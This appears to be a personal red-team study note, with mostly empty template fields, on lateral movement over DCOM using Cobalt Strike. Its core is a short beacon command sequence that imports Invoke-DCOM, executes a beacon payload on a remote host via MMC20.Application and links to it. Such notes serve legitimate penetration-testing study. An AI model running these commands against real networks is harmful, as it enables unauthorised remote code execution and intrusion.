---
creation date: September 23rd 2022
last modified date: September 23rd 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[DCOM]]  
___

## Description:  
For Lateral Movement.


### CobaltStrike
Beacon has no built-in capabilities to interact over Distributed Component Object Model (DCOM), so must use an external tool such as [Invoke-DCOM](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1). 

```
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName srv-1 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
Completed

beacon> link srv-1
[+] established link to child beacon: 10.10.17.25

```



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 23rd 2022 (04:27 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
